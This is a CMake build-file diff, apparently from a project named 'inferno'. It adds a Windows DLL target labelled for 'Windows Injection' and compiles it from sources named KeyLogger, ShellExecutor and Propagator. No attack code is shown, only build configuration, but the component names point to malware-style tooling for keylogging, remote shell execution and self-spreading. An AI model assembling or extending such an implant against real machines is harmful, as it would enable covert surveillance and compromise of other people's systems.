@@ -139,6 +139,26 @@ if(APPLE)
 endif()
 
 # ==========================================
+# 5b. Agent DLL (Phase 4B — Windows Injection)
+# ==========================================
+if(WIN32)
+    add_library(inferno_agent_dll SHARED
+        client/src/entry_dll.cpp
+        client/src/Agent.cpp
+        client/src/ProcessProfiler.cpp
+        client/src/ShellExecutor.cpp
+        client/src/KeyLogger.cpp
+        client/src/Propagator.cpp
+    )
+    target_include_directories(inferno_agent_dll PRIVATE client/include)
+    target_compile_definitions(inferno_agent_dll PRIVATE INFERNO_DLL)
+    target_link_libraries(inferno_agent_dll PRIVATE inferno_common ws2_32)
+    set_target_properties(inferno_agent_dll PROPERTIES
+        OUTPUT_NAME "inferno_agent"
+    )
+endif()
+
+# ==========================================
 # 6. TDD Infrastructure
 # ==========================================
 enable_testing()
@@ -185,6 +205,9 @@ endif()
 if(WIN32)
     target_compile_definitions(inferno_tests PRIVATE _CRT_SECURE_NO_WARNINGS)
     target_link_libraries(inferno_tests PRIVATE ws2_32 advapi32 user32)
+    target_sources(inferno_tests PRIVATE
+        client/src/entry_dll.cpp
+    )
 endif()
 
 add_test(NAME CoreNetworkingTests COMMAND inferno_tests)
